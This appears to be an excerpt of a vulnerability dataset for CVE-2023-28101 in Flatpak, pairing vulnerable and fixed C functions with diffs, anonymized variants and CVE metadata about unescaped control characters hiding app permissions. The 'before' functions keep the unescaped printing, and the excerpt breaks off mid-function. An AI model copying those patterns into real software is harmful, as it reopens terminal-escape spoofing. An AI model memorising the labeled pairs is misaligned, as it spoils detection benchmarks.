        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""License:""), -1));
      if (VAR_23 != NULL)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Collection:""), -1));
      if (VAR_30)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Download:""), -1));
      if (VAR_29)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Installed:""), -1));
      if (flatpak_decomposed_is_app (VAR_17) == 0 && VAR_26 != NULL)
        {
          VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Runtime:""), -1));
          VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Sdk:""), -1));
        }
      if (VAR_33)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Date:""), -1));
      if (VAR_31)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Subject:""), -1));
      VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Commit:""), -1));
      if (VAR_19)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Parent:""), -1));
      if (VAR_24)
        VAR_52 = MAX (VAR_52, strlen (_(""End-of-life:"")));
      if (VAR_25)
        VAR_52 = MAX (VAR_52, strlen (_(""End-of-life-rebase:"")));
      if (VAR_65)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""History:""), -1));

      VAR_55 = VAR_54 - (VAR_52 + 1);

      print_aligned (VAR_52, _(""ID:""), VAR_60);
      print_aligned (VAR_52, _(""Ref:""), flatpak_decomposed_get_ref (VAR_17));
      print_aligned_take (VAR_52, _(""Arch:""), flatpak_decomposed_dup_arch (VAR_17));
      print_aligned_take (VAR_52, _(""Branch:""), flatpak_decomposed_dup_branch (VAR_17));
      if (VAR_58 != NULL)
        print_aligned (VAR_52, _(""Version:""), VAR_58);
      if (VAR_59 != NULL)
        print_aligned (VAR_52, _(""License:""), VAR_59);
      if (VAR_23 != NULL)
        print_aligned (VAR_52, _(""Collection:""), VAR_23);
      if (VAR_30)
        print_aligned (VAR_52, _(""Download:""), VAR_30);
      if (VAR_29)
        print_aligned (VAR_52, _(""Installed:""), VAR_29);
      if (flatpak_decomposed_is_app (VAR_17) && VAR_26 != NULL)
        {
          g_autofree char *VAR_66 = g_key_file_get_string (VAR_26, ""Application"", ""runtime"", VAR_3);
          print_aligned (VAR_52, _(""Runtime:""), VAR_66 ? VAR_66 : ""-"");
        }
      if (flatpak_decomposed_is_app (VAR_17) && VAR_26 != NULL)
        {
          g_autofree char *VAR_67 = g_key_file_get_string (VAR_26, ""Application"", ""sdk"", VAR_3);
          print_aligned (VAR_52, _(""Sdk:""), VAR_67 ? VAR_67 : ""-"");
        }
      g_print (""\n"");
      {
        g_autofree char *VAR_68 = ellipsize_string (VAR_18, VAR_55);
        print_aligned (VAR_52, _(""Commit:""), VAR_68);
      }
      if (VAR_19)
        {
          g_autofree char *VAR_68 = ellipsize_string (VAR_19, VAR_55);
          print_aligned (VAR_52, _(""Parent:""), VAR_68);
        }
      if (VAR_24)
        {
          g_autofree char *VAR_69 = ellipsize_string (VAR_24, VAR_55);
          print_aligned (VAR_52, _(""End-of-life:""), VAR_69);
        }
      if (VAR_25)
        {
          g_autofree char *VAR_69 = ellipsize_string (VAR_25, VAR_55);
          print_aligned (VAR_52, _(""End-of-life-rebase:""), VAR_69);
        }

      if (VAR_31)
        print_aligned (VAR_52, _(""Subject:""), VAR_31);
      if (VAR_33)
        print_aligned (VAR_52, _(""Date:""), VAR_33);

      if (VAR_65)
        {
          g_autofree char *VAR_70 = g_strdup (VAR_19);

          print_aligned (VAR_52, _(""History:""), ""\n"");

          while (VAR_70)
            {
              g_autofree char *VAR_71 = NULL;
              const gchar *VAR_72;
              guint64 VAR_73;
              g_autofree char *VAR_74 = NULL;
              VAR_4(GVariant) VAR_75 = NULL;
              VarCommitRef VAR_76;

              VAR_75 = flatpak_remote_state_load_ref_commit (VAR_20, VAR_7, flatpak_decomposed_get_ref (VAR_17),
                                                                 VAR_70, NULL, NULL, VAR_2, NULL);
              if (VAR_75 == NULL)
                break;

              VAR_71 = ostree_commit_get_parent (VAR_75);
              VAR_73 = ostree_commit_get_timestamp (VAR_75);
              VAR_74 = format_timestamp (VAR_73);

              VAR_76 = var_commit_from_gvariant (VAR_75);
              VAR_72 = var_commit_get_subject (VAR_76);

              print_aligned (VAR_52, _("" Commit:""), VAR_70);
              print_aligned (VAR_52, _("" Subject:""), VAR_72);
              print_aligned (VAR_52, _("" Date:""), VAR_74);

              g_free (VAR_70);
              VAR_70 = g_steal_pointer (&VAR_71);
              if (VAR_70)
                g_print (""\n"");
            }
        }
    }
  else
    {
      VAR_4(GVariant) VAR_77 = NULL;
      g_autofree char *VAR_78 = g_strdup (VAR_18);

      if (VAR_8)
        VAR_77 = g_variant_ref (VAR_8);

      do
        {
          g_autofree char *VAR_70 = NULL;
          VAR_4(GVariant) VAR_79 = NULL;
          gboolean VAR_80 = TRUE;

          if (VAR_77)
            {
              VAR_79 = g_variant_get_child_value (VAR_77, 0);
              VAR_70 = ostree_commit_get_parent (VAR_77);
            }

          if (VAR_79)
            {
              g_variant_lookup (VAR_79, ""xa.metadata"", ""&s"", &VAR_22);
              if (VAR_22 == NULL)
                g_printerr (_(""Warning: Commit %s has no flatpak metadata\n""), VAR_78);
              else
                {
                  VAR_26 = g_key_file_new ();
                  if (!g_key_file_load_from_data (VAR_26, VAR_22, -1, 0, VAR_3))
                    return FALSE;
                }
            }

          if (VAR_46)
            {
              maybe_print_space (&VAR_80);
              g_print (""%s"", flatpak_decomposed_get_ref (VAR_17));
            }

          if (VAR_47)
            {
              maybe_print_space (&VAR_80);
              g_print (""%s"", VAR_78);
            }

          if (VAR_48)
            {
              maybe_print_space (&VAR_80);
              g_print (""%s"", VAR_70 ? VAR_70 : ""-"");
            }

          if (VAR_50)
            {
              g_autofree char *VAR_66 = NULL;
              maybe_print_space (&VAR_80);

              if (VAR_26)
                VAR_66 = g_key_file_get_string (VAR_26, flatpak_decomposed_get_kind_metadata_group (VAR_17), ""runtime"", NULL);
              g_print (""%s"", VAR_66 ? VAR_66 : ""-"");
            }

          if (VAR_51)
            {
              g_autofree char *VAR_67 = NULL;
              maybe_print_space (&VAR_80);

              if (VAR_26)
                VAR_67 = g_key_file_get_string (VAR_26, flatpak_decomposed_get_kind_metadata_group (VAR_17), ""sdk"", NULL);
              g_print (""%s"", VAR_67 ? VAR_67 : ""-"");
            }

          if (!VAR_80)
            g_print (""\n"");

          if (VAR_49)
            {
              if (VAR_22 != NULL)
                flatpak_print_escaped_string (VAR_22,
                                              VAR_81
                                              | VAR_82);
              if (VAR_22 == NULL || !g_str_has_suffix (VAR_22, ""\n""))
                g_print (""\n"");
            }

          g_free (VAR_78);
          VAR_78 = g_steal_pointer (&VAR_70);

          if (VAR_77)
            g_variant_unref (VAR_77);
          VAR_77 = NULL;

          if (VAR_78 && VAR_65)
            VAR_77 = flatpak_remote_state_load_ref_commit (VAR_20, VAR_7,
                                                        flatpak_decomposed_get_ref (VAR_17),
                                                        VAR_78, NULL, NULL, VAR_2, NULL);
        }
      while (VAR_77 != NULL);
    }

  return TRUE;
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-builtins-remote-info.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -353,7 +353,10 @@
 
           if (opt_show_metadata)
             {
-              g_print (""%s"", xa_metadata ? xa_metadata : """");
+              if (xa_metadata != NULL)
+                flatpak_print_escaped_string (xa_metadata,
+                                              FLATPAK_ESCAPE_ALLOW_NEWLINES
+                                              | FLATPAK_ESCAPE_DO_NOT_QUOTE);
               if (xa_metadata == NULL || !g_str_has_suffix (xa_metadata, ""\n""))
                 g_print (""\n"");
             }","{'deleted_lines': ['              g_print (""%s"", xa_metadata ? xa_metadata : """");'], 'added_lines': ['              if (xa_metadata != NULL)', '                flatpak_print_escaped_string (xa_metadata,', '                                              FLATPAK_ESCAPE_ALLOW_NEWLINES', '                                              | FLATPAK_ESCAPE_DO_NOT_QUOTE);']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-04T22:23:37Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Ensure special characters in permissions and metadata are escaped

This prevents someone from placing special characters in order to
manipulate the appearance of the permissions list.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>",6cac99dafe6003c8a4bd5666341c217876536869,https://github.com/flatpak/flatpak/commit/6cac99dafe6003c8a4bd5666341c217876536869,common/flatpak-utils.c,load_kernel_module_list,"static GHashTable *
load_kernel_module_list (void)
{
GHashTable *modules = g_hash_table_new_full (g_str_hash, g_str_equal, g_free, NULL);
g_autofree char *modules_data = NULL;
g_autoptr(GError) error = NULL;
char *start, *end;
if (!g_file_get_contents (""/proc/modules"", &modules_data, NULL, &error))
{
g_info (""Failed to read /proc/modules: %s"", error->message);
return modules;
}
start = modules_data;
while (TRUE)
{
end = strchr (start, ' ');
if (end == NULL)
break;
g_hash_table_add (modules, g_strndup (start, (end - start)));
start = strchr (end, '\n');
if (start == NULL)
break;
start++;
}
return modules;
}","static GHashTable *
load_kernel_module_list (void)
{
GHashTable *VAR_0 = g_hash_table_new_full (VAR_1, VAR_2, VAR_3, NULL);
g_autofree VAR_4 *VAR_5 = NULL;
VAR_6(GError) VAR_7 = NULL;
char *VAR_8, *VAR_9;
if (!g_file_get_contents (""/proc/modules"", &VAR_5, NULL, &VAR_7))
{
g_info (""Failed to read /proc/modules: %s"", VAR_7->message);
return VAR_0;
}
VAR_8 = VAR_5;
while (TRUE)
{
VAR_9 = strchr (VAR_8, ' ');
if (VAR_9 == NULL)
break;
g_hash_table_add (VAR_0, g_strndup (VAR_8, (VAR_9 - VAR_8)));
VAR_8 = strchr (VAR_9, '\n');
if (VAR_8 == NULL)
break;
VAR_8++;
}
return VAR_0;
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-utils.c/vul/before/0.json,"static GHashTable *
load_kernel_module_list (void)
{
  GHashTable *modules = g_hash_table_new_full (g_str_hash, g_str_equal, g_free, NULL);
  g_autofree char *modules_data = NULL;
  g_autoptr(GError) error = NULL;
  char *start, *end;

  if (!g_file_get_contents (""/proc/modules"", &modules_data, NULL, &error))
    {
      g_info (""Failed to read /proc/modules: %s"", error->message);
      return modules;
    }

  /* /proc/modules is a table of modules.
   * Columns are split by spaces and rows by newlines.
   * The first column is the name. */
  start = modules_data;
  while (TRUE)
    {
      end = strchr (start, ' ');
      if (end == NULL)
        break;

      g_hash_table_add (modules, g_strndup (start, (end - start)));

      start = strchr (end, '\n');
      if (start == NULL)
        break;

      start++;
    }

  return modules;
}","static GHashTable *
load_kernel_module_list (void)
{
  GHashTable *VAR_0 = g_hash_table_new_full (VAR_1, VAR_2, VAR_3, NULL);
  g_autofree VAR_4 *VAR_5 = NULL;
  VAR_6(GError) VAR_7 = NULL;
  char *VAR_8, *VAR_9;

  if (!g_file_get_contents (""/proc/modules"", &VAR_5, NULL, &VAR_7))
    {
      g_info (""Failed to read /proc/modules: %s"", VAR_7->message);
      return VAR_0;
    }

  /* COMMENT_0 */
                                                      
                                     
  VAR_8 = VAR_5;
  while (TRUE)
    {
      VAR_9 = strchr (VAR_8, ' ');
      if (VAR_9 == NULL)
        break;

      g_hash_table_add (VAR_0, g_strndup (VAR_8, (VAR_9 - VAR_8)));

      VAR_8 = strchr (VAR_9, '\n');
      if (VAR_8 == NULL)
        break;

      VAR_8++;
    }

  return VAR_0;
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-utils.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -5,7 +5,7 @@
   g_autofree char *modules_data = NULL;
   g_autoptr(GError) error = NULL;
   char *start, *end;
-  
+
   if (!g_file_get_contents (""/proc/modules"", &modules_data, NULL, &error))
     {
       g_info (""Failed to read /proc/modules: %s"", error->message);","{'deleted_lines': ['  '], 'added_lines': ['']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-04T22:23:37Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Ensure special characters in permissions and metadata are escaped

This prevents someone from placing special characters in order to
manipulate the appearance of the permissions list.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>",6cac99dafe6003c8a4bd5666341c217876536869,https://github.com/flatpak/flatpak/commit/6cac99dafe6003c8a4bd5666341c217876536869,app/flatpak-cli-transaction.c,print_perm_line,"static void
print_perm_line (int        idx,
GPtrArray *items,
int        cols)
{
g_autoptr(GString) res = g_string_new (NULL);
int i;
g_string_append_printf (res, ""    [%d] %s"", idx, (char *) items->pdata[0]);
for (i = 1; i < items->len; i++)
{
char *p;
int len;
p = strrchr (res->str, '\n');
if (!p)
p = res->str;
len = (res->str + strlen (res->str)) - p;
if (len + strlen ((char *) items->pdata[i]) + 2 >= cols)
g_string_append_printf (res, "",\n        %s"", (char *) items->pdata[i]);
else
g_string_append_printf (res, "", %s"", (char *) items->pdata[i]);
}
g_print (""%s\n"", res->str);
}","static void
print_perm_line (int        VAR_0,
GPtrArray *VAR_1,
int        VAR_2)
{
VAR_3(GString) VAR_4 = g_string_new (NULL);
int VAR_5;
g_string_append_printf (VAR_4, ""    [%d] %s"", VAR_0, (char *) VAR_1->pdata[0]);
for (VAR_5 = 1; VAR_5 < VAR_1->len; VAR_5++)
{
char *VAR_6;
int VAR_7;
VAR_6 = strrchr (VAR_4->str, '\n');
if (!VAR_6)
VAR_6 = VAR_4->str;
VAR_7 = (VAR_4->str + strlen (VAR_4->str)) - VAR_6;
if (VAR_7 + strlen ((char *) VAR_1->pdata[VAR_5]) + 2 >= VAR_2)
g_string_append_printf (VAR_4, "",\n        %s"", (char *) VAR_1->pdata[VAR_5]);
else
g_string_append_printf (VAR_4, "", %s"", (char *) VAR_1->pdata[VAR_5]);
}
g_print (""%s\n"", VAR_4->str);
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-cli-transaction.c/vul/before/0.json,"static void
print_perm_line (int        idx,
                 GPtrArray *items,
                 int        cols)
{
  g_autoptr(GString) res = g_string_new (NULL);
  g_autofree char *escaped_first_perm = NULL;
  int i;

  escaped_first_perm = flatpak_escape_string (items->pdata[0], FLATPAK_ESCAPE_DEFAULT);
  g_string_append_printf (res, ""    [%d] %s"", idx, escaped_first_perm);

  for (i = 1; i < items->len; i++)
    {
      g_autofree char *escaped = flatpak_escape_string (items->pdata[i],
                                                        FLATPAK_ESCAPE_DEFAULT);
      char *p;
      int len;

      p = strrchr (res->str, '\n');
      if (!p)
        p = res->str;

      len = (res->str + strlen (res->str)) - p;
      if (len + strlen (escaped) + 2 >= cols)
        g_string_append_printf (res, "",\n        %s"", escaped);
      else
        g_string_append_printf (res, "", %s"", escaped);
    }

  g_print (""%s\n"", res->str);
}","static void
print_perm_line (int        VAR_0,
                 GPtrArray *VAR_1,
                 int        VAR_2)
{
  VAR_3(GString) VAR_4 = g_string_new (NULL);
  g_autofree VAR_5 *VAR_6 = NULL;
  int VAR_7;

  VAR_6 = flatpak_escape_string (VAR_1->pdata[0], VAR_8);
  g_string_append_printf (VAR_4, ""    [%d] %s"", VAR_0, VAR_6);

  for (VAR_7 = 1; VAR_7 < VAR_1->len; VAR_7++)
    {
      g_autofree VAR_5 *VAR_9 = flatpak_escape_string (VAR_1->pdata[VAR_7],
                                                        VAR_8);
      char *VAR_10;
      int VAR_11;

      VAR_10 = strrchr (VAR_4->str, '\n');
      if (!VAR_10)
        VAR_10 = VAR_4->str;

      VAR_11 = (VAR_4->str + strlen (VAR_4->str)) - VAR_10;
      if (VAR_11 + strlen (VAR_9) + 2 >= VAR_2)
        g_string_append_printf (VAR_4, "",\n        %s"", VAR_9);
      else
        g_string_append_printf (VAR_4, "", %s"", VAR_9);
    }

  g_print (""%s\n"", VAR_4->str);
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-cli-transaction.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -4,12 +4,16 @@
                  int        cols)
 {
   g_autoptr(GString) res = g_string_new (NULL);
+  g_autofree char *escaped_first_perm = NULL;
   int i;
 
-  g_string_append_printf (res, ""    [%d] %s"", idx, (char *) items->pdata[0]);
+  escaped_first_perm = flatpak_escape_string (items->pdata[0], FLATPAK_ESCAPE_DEFAULT);
+  g_string_append_printf (res, ""    [%d] %s"", idx, escaped_first_perm);
 
   for (i = 1; i < items->len; i++)
     {
+      g_autofree char *escaped = flatpak_escape_string (items->pdata[i],
+                                                        FLATPAK_ESCAPE_DEFAULT);
       char *p;
       int len;
 
@@ -18,10 +22,10 @@
         p = res->str;
 
       len = (res->str + strlen (res->str)) - p;
-      if (len + strlen ((char *) items->pdata[i]) + 2 >= cols)
-        g_string_append_printf (res, "",\n        %s"", (char *) items->pdata[i]);
+      if (len + strlen (escaped) + 2 >= cols)
+        g_string_append_printf (res, "",\n        %s"", escaped);
       else
-        g_string_append_printf (res, "", %s"", (char *) items->pdata[i]);
+        g_string_append_printf (res, "", %s"", escaped);
     }
 
   g_print (""%s\n"", res->str);","{'deleted_lines': ['  g_string_append_printf (res, ""    [%d] %s"", idx, (char *) items->pdata[0]);', '      if (len + strlen ((char *) items->pdata[i]) + 2 >= cols)', '        g_string_append_printf (res, "",\\n        %s"", (char *) items->pdata[i]);', '        g_string_append_printf (res, "", %s"", (char *) items->pdata[i]);'], 'added_lines': ['  g_autofree char *escaped_first_perm = NULL;', '  escaped_first_perm = flatpak_escape_string (items->pdata[0], FLATPAK_ESCAPE_DEFAULT);', '  g_string_append_printf (res, ""    [%d] %s"", idx, escaped_first_perm);', '      g_autofree char *escaped = flatpak_escape_string (items->pdata[i],', '                                                        FLATPAK_ESCAPE_DEFAULT);', '      if (len + strlen (escaped) + 2 >= cols)', '        g_string_append_printf (res, "",\\n        %s"", escaped);', '        g_string_append_printf (res, "", %s"", escaped);']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-04T22:23:37Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Ensure special characters in permissions and metadata are escaped

This prevents someone from placing special characters in order to
manipulate the appearance of the permissions list.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>",6cac99dafe6003c8a4bd5666341c217876536869,https://github.com/flatpak/flatpak/commit/6cac99dafe6003c8a4bd5666341c217876536869,app/flatpak-builtins-info.c,flatpak_builtin_info,"gboolean
flatpak_builtin_info (int argc, char **argv, GCancellable *cancellable, GError **error)
{
g_autoptr(GOptionContext) context = NULL;
g_autoptr(FlatpakDecomposed) ref = NULL;
g_autoptr(FlatpakDir) dir = NULL;
g_autoptr(GBytes) deploy_data = NULL;
g_autoptr(FlatpakDeploy) deploy = NULL;
g_autoptr(GFile) deploy_dir = NULL;
g_autoptr(GKeyFile) metakey = NULL;
const char *commit = NULL;
const char *alt_id = NULL;
const char *eol;
const char *eol_rebase;
const char *name;
const char *summary;
const char *version;
const char *license;
const char *pref = NULL;
const char *default_branch = NULL;
const char *origin = NULL;
guint64 size;
gboolean search_all = FALSE;
gboolean first = TRUE;
FlatpakKinds kinds;
const char *path;
g_autofree char *formatted_size = NULL;
gboolean friendly = TRUE;
g_autofree const char **subpaths = NULL;
int len = 0;
int rows, cols;
int width;
context = g_option_context_new (_(""NAME [BRANCH] - Get info about an installed app or runtime""));
g_option_context_set_translation_domain (context, GETTEXT_PACKAGE);
if (!flatpak_option_context_parse (context, options, &argc, &argv, FLATPAK_BUILTIN_FLAG_NO_DIR, NULL, cancellable, error))
return FALSE;
if (argc < 2)
return usage_error (context, _(""NAME must be specified""), error);
pref = argv[1];
if (argc >= 3)
default_branch = argv[2];
if (argc > 3)
return usage_error (context, _(""Too many arguments""), error);
kinds = FLATPAK_KINDS_APP | FLATPAK_KINDS_RUNTIME;
if (!opt_user && !opt_system && opt_installations == NULL)
search_all = TRUE;
dir = flatpak_find_installed_pref (pref, kinds, opt_arch, default_branch,
search_all, opt_user, opt_system, opt_installations,
&ref, cancellable, error);
if (dir == NULL)
return FALSE;
deploy_data = flatpak_dir_get_deploy_data (dir, ref, FLATPAK_DEPLOY_VERSION_CURRENT, cancellable, error);
if (deploy_data == NULL)
return FALSE;
deploy = flatpak_dir_load_deployed (dir, ref, NULL, cancellable, error);
if (deploy == NULL)
return FALSE;
commit = flatpak_deploy_data_get_commit (deploy_data);
alt_id = flatpak_deploy_data_get_alt_id (deploy_data);
origin = flatpak_deploy_data_get_origin (deploy_data);
size = flatpak_deploy_data_get_installed_size (deploy_data);
formatted_size = g_format_size (size);
deploy_dir = flatpak_deploy_get_dir (deploy);
path = flatpak_file_get_path_cached (deploy_dir);
subpaths = flatpak_deploy_data_get_subpaths (deploy_data);
eol = flatpak_deploy_data_get_eol (deploy_data);
eol_rebase = flatpak_deploy_data_get_eol_rebase (deploy_data);
name = flatpak_deploy_data_get_appdata_name (deploy_data);
summary = flatpak_deploy_data_get_appdata_summary (deploy_data);
version = flatpak_deploy_data_get_appdata_version (deploy_data);
license = flatpak_deploy_data_get_appdata_license (deploy_data);
metakey = flatpak_deploy_get_metadata (deploy);
if (opt_show_ref || opt_show_origin || opt_show_commit || opt_show_size || opt_show_metadata || opt_show_permissions ||
opt_file_access || opt_show_location || opt_show_runtime || opt_show_sdk)
friendly = FALSE;
if (friendly)
{
g_autoptr(GVariant) commit_v = NULL;
VarMetadataRef commit_metadata;
guint64 timestamp;
g_autofree char *formatted_timestamp = NULL;
const gchar *subject = NULL;
g_autofree char *parent = NULL;
g_autofree char *latest = NULL;
const char *xa_metadata = NULL;
const char *collection_id = NULL;
flatpak_get_window_size (&rows, &cols);
if (name)
{
if (summary)
print_wrapped (MIN (cols, 80), ""\n%s - %s\n"", name, summary);
else
print_wrapped (MIN (cols, 80), ""\n%s\n"", name);
}
latest = flatpak_dir_read_latest (dir, origin, flatpak_decomposed_get_ref (ref), NULL, NULL, NULL);
if (latest == NULL)
latest = g_strdup (_(""ref not present in origin""));
if (ostree_repo_load_commit (flatpak_dir_get_repo (dir), commit, &commit_v, NULL, NULL))
{
VarCommitRef var_commit = var_commit_from_gvariant (commit_v);
subject = var_commit_get_subject (var_commit);
parent = ostree_commit_get_parent (commit_v);
timestamp = ostree_commit_get_timestamp (commit_v);
formatted_timestamp = format_timestamp (timestamp);
commit_metadata = var_commit_get_metadata (var_commit);
xa_metadata = var_metadata_lookup_string (commit_metadata, ""xa.metadata"", NULL);
if (xa_metadata == NULL)
g_printerr (_(""Warning: Commit has no flatpak metadata\n""));
collection_id = var_metadata_lookup_string (commit_metadata, ""ostree.collection-binding"", NULL);
}
len = 0;
len = MAX (len, g_utf8_strlen (_(""ID:""), -1));
len = MAX (len, g_utf8_strlen (_(""Ref:""), -1));
len = MAX (len, g_utf8_strlen (_(""Arch:""), -1));
len = MAX (len, g_utf8_strlen (_(""Branch:""), -1));
if (version)
len = MAX (len, g_utf8_strlen (_(""Version:""), -1));
if (license)
len = MAX (len, g_utf8_strlen (_(""License:""), -1));
if (collection_id != NULL)
len = MAX (len, g_utf8_strlen (_(""Collection:""), -1));
len = MAX (len, g_utf8_strlen (_(""Installation:""), -1));
len = MAX (len, g_utf8_strlen (_(""Installed:""), -1));
if (flatpak_decomposed_is_app (ref))
{
len = MAX (len, g_utf8_strlen (_(""Runtime:""), -1));
len = MAX (len, g_utf8_strlen (_(""Sdk:""), -1));
}
if (formatted_timestamp)
len = MAX (len, g_utf8_strlen (_(""Date:""), -1));
if (subject)
len = MAX (len, g_utf8_strlen (_(""Subject:""), -1));
if (strcmp (commit, latest) != 0)
{
len = MAX (len, g_utf8_strlen (_(""Active commit:""), -1));
len = MAX (len, g_utf8_strlen (_(""Latest commit:""), -1));
}
else
len = MAX (len, g_utf8_strlen (_(""Commit:""), -1));
if (parent)
len = MAX (len, g_utf8_strlen (_(""Parent:""), -1));
if (alt_id)
len = MAX (len, g_utf8_strlen (_(""Alt-id:""), -1));
if (eol)
len = MAX (len, g_utf8_strlen (_(""End-of-life:""), -1));
if (eol_rebase)
len = MAX (len, g_utf8_strlen (_(""End-of-life-rebase:""), -1));
if (subpaths[0] != NULL)
len = MAX (len, g_utf8_strlen (_(""Subdirectories:""), -1));
len = MAX (len, g_utf8_strlen (_(""Extension:""), -1));
width = cols - (len + 1);
print_aligned_take (len, _(""ID:""), flatpak_decomposed_dup_id (ref));
print_aligned (len, _(""Ref:""), flatpak_decomposed_get_ref (ref));
print_aligned_take (len, _(""Arch:""), flatpak_decomposed_dup_arch (ref));
print_aligned_take (len, _(""Branch:""), flatpak_decomposed_dup_branch (ref));
if (version)
print_aligned (len, _(""Version:""), version);
if (license)
print_aligned (len, _(""License:""), license);
print_aligned (len, _(""Origin:""), origin ? origin : ""-"");
if (collection_id)
print_aligned (len, _(""Collection:""), collection_id);
print_aligned (len, _(""Installation:""), flatpak_dir_get_name_cached (dir));
print_aligned (len, _(""Installed:""), formatted_size);
if (flatpak_decomposed_is_app (ref))
{
g_autofree char *runtime = NULL;
runtime = g_key_file_get_string (metakey,
FLATPAK_METADATA_GROUP_APPLICATION,
FLATPAK_METADATA_KEY_RUNTIME,
error);
print_aligned (len, _(""Runtime:""), runtime ? runtime : ""-"");
}
if (flatpak_decomposed_is_app (ref))
{
g_autofree char *sdk = NULL;
sdk = g_key_file_get_string (metakey,
FLATPAK_METADATA_GROUP_APPLICATION,
FLATPAK_METADATA_KEY_SDK,
error);
print_aligned (len, _(""Sdk:""), sdk ? sdk : ""-"");
}
g_print (""\n"");
if (strcmp (commit, latest) != 0)
{
g_autofree char *formatted_commit = ellipsize_string (commit, width);
print_aligned (len, _(""Active commit:""), formatted_commit);
g_free (formatted_commit);
formatted_commit = ellipsize_string (latest, width);
print_aligned (len, _(""Latest commit:""), formatted_commit);
}
else
{
g_autofree char *formatted_commit = ellipsize_string (commit, width);
print_aligned (len, _(""Commit:""), formatted_commit);
}
if (parent)
{
g_autofree char *formatted_commit = ellipsize_string (parent, width);
print_aligned (len, _(""Parent:""), formatted_commit);
}
if (subject)
print_aligned (len, _(""Subject:""), subject);
if (formatted_timestamp)
print_aligned (len, _(""Date:""), formatted_timestamp);
if (subpaths[0] != NULL)
{
g_autofree char *s = g_strjoinv ("","", (char **) subpaths);
print_aligned (len, _(""Subdirectories:""), s);
}
if (alt_id)
print_aligned (len, _(""Alt-id:""), alt_id);
if (eol)
{
g_autofree char *formatted_eol = ellipsize_string (eol, width);
print_aligned (len, _(""End-of-life:""), formatted_eol);
}
if (eol_rebase)
{
g_autofree char *formatted_eol = ellipsize_string (eol_rebase, width);
print_aligned (len, _(""End-of-life-rebase:""), formatted_eol);
}
}
else
{
if (opt_show_ref)
{
maybe_print_space (&first);
g_print (""%s"", flatpak_decomposed_get_ref (ref));
}
if (opt_show_origin)
{
maybe_print_space (&first);
g_print (""%s"", origin ? origin : ""-"");
}
if (opt_show_commit)
{
maybe_print_space (&first);
g_print (""%s"", commit);
}
if (opt_show_size)
{
maybe_print_space (&first);
g_print (""%"" G_GUINT64_FORMAT, size);
}
if (opt_show_location)
{
maybe_print_space (&first);
g_print (""%s"", path);
}
if (opt_show_runtime)
{
g_autofree char *runtime = NULL;
maybe_print_space (&first);
runtime = g_key_file_get_string (metakey,
flatpak_decomposed_get_kind_metadata_group (ref),
FLATPAK_METADATA_KEY_RUNTIME,
NULL);
g_print (""%s"", runtime ? runtime : ""-"");
}
if (opt_show_sdk)
{
g_autofree char *sdk = NULL;
maybe_print_space (&first);
sdk = g_key_file_get_string (metakey,
flatpak_decomposed_get_kind_metadata_group (ref),
FLATPAK_METADATA_KEY_SDK,
NULL);
g_print (""%s"", sdk ? sdk : ""-"");
}
if (!first)
g_print (""\n"");
if (opt_show_metadata)
{
g_autoptr(GFile) file = NULL;
g_autofree char *data = NULL;
gsize data_size;
file = g_file_get_child (deploy_dir, ""metadata"");
if (!g_file_load_contents (file, cancellable, &data, &data_size, NULL, error))
return FALSE;
g_print (""%s"", data);
}
if (opt_show_permissions || opt_file_access)
{
g_autoptr(FlatpakContext) app_context = NULL;
